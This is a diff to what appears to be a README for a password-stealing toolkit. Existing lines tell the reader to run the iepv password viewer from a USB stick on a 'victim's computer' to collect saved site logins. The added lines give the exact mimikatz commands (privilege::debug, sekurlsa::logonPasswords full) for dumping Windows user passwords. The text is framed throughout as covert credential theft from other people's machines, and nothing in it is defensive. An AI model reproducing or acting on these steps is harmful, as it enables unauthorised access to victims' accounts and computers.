@@ -42,3 +42,15 @@ How to activate this programm:
 > or open iepv on victim's computer from USB and tap the button in this programm "Save selected items".
 
 And you will have passwords and usernames from other sites!
+
+Mimikatz_trunk this is script for hacking computer passwords:
+
+> Open mimikatz.exe
+
+Run commands in mimikatz:
+
+> mimikatz # privilege::debug
+
+> mimikatz # sekurlsa::logonPasswords full
+
+And you will have user passwords!
